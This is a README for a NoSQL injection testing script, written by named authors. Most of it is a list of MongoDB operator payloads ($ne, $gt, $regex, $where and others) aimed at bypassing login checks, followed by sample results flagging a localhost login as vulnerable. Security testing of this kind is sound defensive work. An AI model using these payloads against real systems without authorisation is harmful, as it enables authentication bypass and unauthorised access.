# NoSQL Injection Testing Script

This script is designed to test web applications for NoSQL Injection vulnerabilities by sending various payloads to a specified endpoint and checking the responses.

## Prerequisites

Ensure you have the following installed:

- Python 3.x
- `requests` library (`pip install requests`)

## Files

1. **`urls.txt`**: A file containing the URL(s) of the web application endpoint(s) to be tested.
2. **`payloads.json`**: A file containing the payloads to be used for testing NoSQL Injection vulnerabilities.
3. **`results.json`**: The output file where the results of the tests will be stored.

### `urls.txt`
A plain text file with each line containing a URL to test. Example:
```
http://localhost:5000/login
```

### `payloads.json`
A JSON file with an array of payloads to be tested. Example:
```json
[
    {"username": {"$ne": null}, "password": "password"},
    {"username": "admin", "password": {"$ne": null}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$exists": true}, "password": "password"},
    {"username": "admin", "password": {"$lt": "z"}},
    {"username": {"$regex": ""}, "password": "password"},
    {"username": {"$ne": "nonexistent"}, "password": "password"},
    {"username": {"$in": ["admin", "user"]}, "password": "password"},
    {"username": {"$nin": []}, "password": "password"},
    {"username": "admin", "password": {"$gte": ""}},
    {"username": {"$type": "string"}, "password": "password"},
    {"username": {"$not": {"$eq": null}}, "password": "password"},
    {"username": {"$and": [{"$gt": ""}, {"$lt": "z"}]}, "password": "password"},
    {"username": {"$or": [{"$gt": ""}, {"$lt": "z"}]}, "password": "password"},
    {"username": {"$mod": [1, 0]}, "password": "password"},
    {"username": {"$where": "this.password.length > 0"}, "password": "password"},
    {"username": {"$ne": "admin"}, "password": {"$ne": "wrong_password"}},
    {"username": {"$gt": "a"}, "password": "password"},
    {"username": {"$regex": "^admin$"}, "password": {"$ne": null}},
    {"username": {"$in": ["admin", "root"]}, "password": {"$ne": null}}
]
```

## Usage

1. Clone the repository or download the script.
2. Ensure you have `urls.txt` and `payloads.json` in the same directory as the script.
3. Run the script:

```bash
python nosql_injection_tester.py
```

The script will read the URLs and payloads, perform the tests, and save the results in `results.json`.

## Output

The results will be stored in `results.json`, with each entry indicating whether the payload was successful (vulnerable) or not.

Example of `results.json`:
```json
[
    {
        "url": "http://localhost:5000/login",
        "payload": {"username": {"$ne": null}, "password": "password"},
        "status": "Vulnerable"
    },
    {
        "url": "http://localhost:5000/login",
        "payload": {"username": "admin", "password": {"$ne": null}},
        "status": "Not Vulnerable"
    }
]
```
Created by:
- Milton Heras
- Jorge Cordero
- Jhoaho Sánchez
- Jairo García
